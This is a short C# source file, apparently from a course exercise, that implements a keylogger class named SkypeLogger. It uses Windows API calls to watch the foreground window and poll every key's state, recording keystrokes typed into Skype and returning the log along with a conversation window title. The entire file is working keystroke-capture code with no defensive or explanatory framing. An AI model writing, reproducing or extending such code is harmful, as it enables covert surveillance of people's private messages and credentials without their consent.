using System;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace CourseTest1
{
    class SkypeLogger : ILogger
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPTStr)] StringBuilder lpString, int nMaxCount);

        public string appname { get; set; }
        public Upgrader upgrader;
        public SkypeLogger(IUpgrade upgrader)
        {
            appname = "Skype";
            this.upgrader = new Upgrader(upgrader);
        }
        public string Log()
        {
            int size = 100000;
            StringBuilder logs = new StringBuilder(size), buff = new StringBuilder(size);
            while (true)
            {
                if (GetWindowText(GetForegroundWindow(), buff, size) > 0)
                {
                    string s = buff.ToString();
                    if (s.Contains(appname) && s.Contains(" - "))
                    {
                        logs.Append(s);
                        return logs.ToString();
                    }
                    if (s == appname)
                    {
                        for (int i = 0; i < 255; i++)
                        {
                            int state = GetAsyncKeyState(i);
                            if (state == 1 || state == -32767)
                            {
                                logs.Append(upgrader.Upgrade(((Keys)i).ToString()));
                            }
                        }
                    }
                }
            }
        }
    }
}